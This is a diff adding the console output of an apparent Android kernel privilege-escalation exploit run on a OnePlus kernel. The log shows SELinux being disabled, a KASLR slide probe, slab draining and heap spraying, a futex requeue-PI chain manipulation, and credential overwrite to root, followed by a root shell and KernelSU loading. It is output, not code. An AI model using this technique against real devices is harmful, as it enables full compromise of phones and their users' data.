@@ -1,0 +1,216 @@
+[33m[T+333.965] [*] [0mknobs: HOLD_CHAIN=1 STAMP_SYNC=1 STAMP_PRE_M4=0 CANARY_SEQ=0 CANARY_RATCHET=0 CANARY_ARM=0 CHAIN_BAIL=0 ROUTE_ATTEMPTS=1 OWNER_HANDOFF=0 PUNCH_IN_WINDOW=1 MCAST_SHIFT=24 M4_TIMEOUT_MS=1000 PROBE_BOOTID=0 STAMP_ECHO=0 ARM_T=0 ARM_T_T2=0 SPRAY_TEST=0
+[33m[T+333.965] [*] [0mkernel: 5.4.289-qgki-g8f2019ef68d9
+[32m[T+333.965] [+] [0moffsets matched: 5.4.289-qgki-g8f2019ef68d9
+[33m[T+333.965] [*] [0minit_cred image=ffffffc012a8f5e0 alias=ffffff80aaa0f5e0
+[32m[T+333.965] [+] [0mstartup context pid=16852 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=0
+[32m[T+333.965] [+] [0mstartup limits pid=16852 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[T+333.965] [+] [0mbuild config pid=16852 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[T+333.965] [+] [0mp0 profile pid=16852 phys_offset=0000000080000000 kernel_phys_load=0000000128000000 delta=00000000a8000000 slide_logger=ffffff80aa90ab00 bootid_data=ffffff80aad74bf9 init_task=ffffff80aaa04200 root_tg=ffffff80aac22480 sysctl_bootid=ffffff80aad74bf9
+[33m[T+333.965] [*] [0mp0 kernel_phys_load=0000000128000000 phys_offset=0000000080000000 delta=00000000a8000000
+[32m[T+333.966] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[33m[T+333.967] [*] [0mmemstart probe: start max=8s
+[32m[T+333.976] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+333.986] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+333.997] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.007] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.017] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.027] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.037] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.047] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.057] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.067] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.077] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.087] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.098] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.108] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.118] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.128] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.138] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.148] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.158] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.168] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.178] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.189] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.199] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.209] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.219] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.229] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.239] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.249] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.259] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.269] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.279] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.290] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.300] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.310] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.320] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.330] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.340] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.350] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.360] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.370] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.380] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.391] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.401] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.411] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.421] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.431] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.441] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.451] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.461] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.471] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.482] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.492] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.502] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.512] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.522] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.532] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.542] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.552] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.562] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.572] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.583] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.593] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.603] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.613] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.623] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.633] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.643] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.653] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.663] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.673] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.683] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.694] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.704] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.714] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.724] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.734] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.744] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.754] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.764] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.774] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.784] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.795] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.805] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.815] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.825] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.835] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.845] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.855] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.865] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.875] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.885] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.896] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.906] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.916] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.926] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.936] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.946] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.956] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[32m[T+334.966] [+] [0m*** ENFORCE=0 — SELINUX DISABLED — W1 WRITE LANDED ***
+[33m[T+335.368] [*] [0mmemstart probe: slide=0x10c7800000 votes=21893
+[33m[T+336.368] [*] [0mmemstart probe: done total=111206 wins=62 slide=72066531328 iter=3033
+[33m[T+336.368] [*] [0mdm: override phys_offset=0xffffffc480000000 page_offset=0xffffff8000000000
+[32m[T+336.368] [+] [0mmemstart probe: memstart=0xffffffc480000000 (-238 GiB) slide=0x10c7800000 kinds=3 votes=62
+[33m[T+336.368] [*] [0m[T+0ms] exploit start
+[32m[T+336.369] [+] [0mSELinux off (UMH or already)
+[33m[T+336.369] [*] [0mUMH not available, falling back to W2 cred path
+[33m[T+336.369] [*] [0mslab_drain: waves=5 batch=400
+[33m[T+336.369] [*] [0mslab_drain: wave 1/5 start
+[33m[T+336.562] [*] [0mslab_drain: wave 1/5 forked 400, killing
+[33m[T+336.829] [*] [0mslab_drain: wave 2/5 start
+[33m[T+337.023] [*] [0mslab_drain: wave 2/5 forked 400, killing
+[33m[T+337.292] [*] [0mslab_drain: wave 3/5 start
+[33m[T+337.479] [*] [0mslab_drain: wave 3/5 forked 400, killing
+[33m[T+337.750] [*] [0mslab_drain: wave 4/5 start
+[33m[T+337.946] [*] [0mslab_drain: wave 4/5 forked 400, killing
+[33m[T+338.212] [*] [0mslab_drain: wave 5/5 start
+[33m[T+338.406] [*] [0mslab_drain: wave 5/5 forked 400, killing
+[33m[T+338.668] [*] [0mslab_drain: drain done
+[33m[T+338.668] [*] [0m[T+2300ms] pre-W2 drain
+[33m[T+338.668] [*] [0mspawning child (perf task_struct probe)...
+[33m[T+338.808] [*] [0mperf task: 0xffffffbdc54cd140 (74/256 votes)
+[33m[T+338.809] [*] [0m[T+2441ms] perf_find_task done
+[33m[T+338.809] [*] [0mchild_pid=18854 child_task=0xffffffbdc54cd140
+[33m[T+338.809] [*] [0mW2: cred_off=0x880 adj=0 target=0xffffffbdc54cd9c0 (child_task=0xffffffbdc54cd140)
+[33m[T+338.809] [*] [0mround 1/2: cred write
+[33m[T+338.809] [*] [0mslab_drain: waves=5 batch=400
+[33m[T+338.809] [*] [0mslab_drain: wave 1/5 start
+[33m[T+339.007] [*] [0mslab_drain: wave 1/5 forked 400, killing
+[33m[T+339.276] [*] [0mslab_drain: wave 2/5 start
+[33m[T+339.467] [*] [0mslab_drain: wave 2/5 forked 400, killing
+[33m[T+339.735] [*] [0mslab_drain: wave 3/5 start
+[33m[T+339.930] [*] [0mslab_drain: wave 3/5 forked 400, killing
+[33m[T+340.203] [*] [0mslab_drain: wave 4/5 start
+[33m[T+340.398] [*] [0mslab_drain: wave 4/5 forked 400, killing
+[33m[T+340.662] [*] [0mslab_drain: wave 5/5 start
+[33m[T+340.858] [*] [0mslab_drain: wave 5/5 forked 400, killing
+[33m[T+341.123] [*] [0mslab_drain: drain done
+[33m[T+341.123] [*] [0m=== W2: cred === target=0xffffffbdc54cd9c0 mode=2
+[33m[T+341.124] [*] [0m[T+4755ms]   heap spray start
+[33m[T+341.126] [*] [0mdm: phys=0x12d9d7000 base=0xffffffbcad9d7000 lock=0xffffffbcad9d7000 w0=0xffffffbcad9d7300 task=0xffffffbcad9d7400
+[33m[T+341.126] [*] [0mdm: plant dump lock=0000000000000000 root=ffffffbcad9d7300 leftmost=ffffffbcad9d7300 owner=ffffffbcad9d7401 w0+38=ffffffbcad9d7000 (expect root=leftmost=w0 owner=task|1 w0+38=lock)
+[33m[T+341.126] [*] [0mdm: mlock plant=0 errno=2
+[33m[T+341.126] [*] [0m[T+4757ms]   heap spray done
+[33m[T+341.127] [*] [0mO0 owner: parked at nice 19 (prio 39)
+[33m[T+341.127] [*] [0mO1 owner: target-locked
+[33m[T+341.127] [*] [0mO2 owner: pre-chain-lock
+[33m[T+341.128] [*] [0mM4 waiter: entering WAIT_REQUEUE_PI (timeout=1000ms)
+[33m[T+341.178] [*] [0mM5 main: firing CMP_REQUEUE_PI
+[33m[T+341.179] [*] [0mM6x probe: f_wait=0 f_pi_target=20858 f_pi_chain=2147504505 main=16852 waiter=20857 owner=20858 waiter_prio=20
+[33m[T+341.179] [*] [0mM6 main: CMP_REQUEUE_PI ret=-1 errno=35
+[33m[T+341.179] [*] [0mM6i main: firing post-M6 in-window punch seq=100 delay=0usec (m4_timeout=1000ms waiter_prio=20)
+[33m[T+341.179] [*] [0mconsumer: saw seq=100
+[33m[T+341.179] [*] [0mDMpre root=ffffffbcad9d7300 leftmost=ffffffbcad9d7300 pc=ffffffd0da28f5e0 child=0000000000000000
+[33m[T+341.179] [*] [0mC0 consumer: about to punch tid=20857 nice=18
+[33m[T+341.179] [*] [0mC2 consumer: first punch ret=0 errno=0
+[33m[T+341.179] [*] [0mP1 consumer: waiter prio18 post-punch=38 (39/38=punch-applied 20=NOT-applied)
+[33m[T+341.179] [*] [0mC3 consumer: owner prio post-punch=39 (38/20=walk-boosted, 39=no-walk)
+[33m[T+341.180] [*] [0mDMcanary root=ffffffbcad9d7300 leftmost=ffffffbcad9d7300 pc=ffffffd0da28f5e0 self=ffffffbcad9d7318 child=0000000000000000 exp_parent=ffffffbdc54cd9b0 usage=0000000000000100 troot=0000000000000000 tleft=0000000000000000 relink=0 erase_ran=0 W1_child=0
+[33m[T+341.180] [*] [0mM4 waiter: WAIT_REQUEUE_PI ret=-1 errno=11 (SF removed)
+[33m[T+341.180] [*] [0mM4b waiter: GL_HOLD_CHAIN — deferring chain unlock until after the carrier (owner stays parked in O2)
+[33m[T+341.180] [*] [0mM6j main: post-M6 in-window punch done=1 waited=1ms
+[33m[T+341.180] [*] [0mmain: M6 done — waiting for route_done
+[33m[T+341.180] [*] [0mmcast shift sweep=24 cycle=0
+[33m[T+341.181] [*] [0mmcast pre-stamp begin attempt=1 payload=0x56e9736a38
+[33m[T+341.181] [*] [0mmcast pre-stamp done attempt=1 ret=-1 errno=22
+[33m[T+341.181] [*] [0mmcast route setup attempt=1 page=ffffffbcad9d7000 fake_lock=ffffffbcad9d7000 fake_w0=ffffffbcad9d7300 fake_task=ffffffbcad9d7400 pre_ret=-1 pre_errno=22 delay=0
+[33m[T+341.181] [*] [0msync pre-stamp begin
+[33m[T+341.181] [*] [0mconsumer: saw seq=1
+[33m[T+341.181] [*] [0mDMpre root=ffffffbcad9d7300 leftmost=ffffffbcad9d7300 pc=ffffffd0da28f5e0 child=0000000000000000
+[33m[T+341.181] [*] [0mC0 consumer: about to punch tid=20857 nice=19
+[33m[T+341.181] [*] [0mC2 consumer: first punch ret=0 errno=0
+[33m[T+341.181] [*] [0mP1 consumer: waiter prio18 post-punch=39 (39/38=punch-applied 20=NOT-applied)
+[33m[T+341.181] [*] [0mC3 consumer: owner prio post-punch=39 (38/20=walk-boosted, 39=no-walk)
+[33m[T+341.181] [*] [0mDMcanary root=ffffffc02b149cd0 leftmost=ffffffc02b149cd0 pc=ffffffbcad9d7318 self=ffffffbcad9d7318 child=0000000000000000 exp_parent=ffffffbdc54cd9b0 usage=0000000000000100 troot=ffffffc02b149ce8 tleft=ffffffc02b149ce8 relink=1 erase_ran=1 W1_child=0
+[33m[T+341.181] [*] [0msync hold done calls=1 success=1
+[33m[T+341.181] [*] [0mmcast returned attempt=1 calls=1 success=1 pre_ret=-1 pre_errno=22 delay=0 +1ms
+[33m[T+341.182] [*] [0mmcast route done calls=1 success=1 step=0 errno=0
+[33m[T+341.183] [*] [0mP2 waiter: own prio post-route=39
+[33m[T+341.183] [*] [0mR1 post-route read fd=4 ret=0 errno=0 val=0000000000000000
+[33m[T+341.183] [*] [0mM4b waiter: post-carrier chain unlock ret=0 errno=0
+[33m[T+341.183] [*] [0mO3 owner: chain-locked
+[33m[T+341.184] [*] [0mP3 waiter: GL_HOLD_WAITER=1 — parking forever to keep pi_blocked_on dangle alive (post-walk exit would walk the ghost on a torn-down stack and panic)
+[33m[T+341.185] [*] [0m[T+4817ms]   PI route done
+[33m[T+341.236] [*] [0mchild uid = 0
+[32m[T+341.236] [+] [0mchild is root!
+[33m[T+341.642] [*] [0mksu_fne: runtime fake kallsyms written: 207919 syms, slide=0x10c7800000
+[+] root shell pid=20860 uid=0
+[*] repairing SELinux policy before KernelSU
+[!] early SELinux policy repair failed; see .ghostlock_policy.log
+[*] ksu_fne chain hook present - launching detached
+[*] waiting for chain to load KernelSU module (up to 90s)
+[33m[T+343.236] [*] [0m[T+6867ms] exploit complete
+[33m[T+343.236] [*] [0mwaiting for KernelSU helper...
+[33m[T+343.237] [*] [0mwaiting for KernelSU helper status (1/40)
+[33m[T+352.242] [*] [0mwaiting for KernelSU helper status (10/40)
+[33m[T+362.255] [*] [0mwaiting for KernelSU helper status (20/40)
+[32m[T+365.256] [+] [0mKernelSU module is loaded
+[+] KSU LOADED
+kernelsu 307200 2 - Loading 0xffffffd0c2303000 (OE+)
+Error: Failed to set persist.adb.tcp.port
+
+Caused by:
+    __system_property_set failed: -1
+[*] uid=0(root) gid=3310148032(u33101_a8032_ext_cache) groups=3310148032(u33101_a8032_ext_cache) context=u:r:kernel:s0 enforce=0
+[+] done
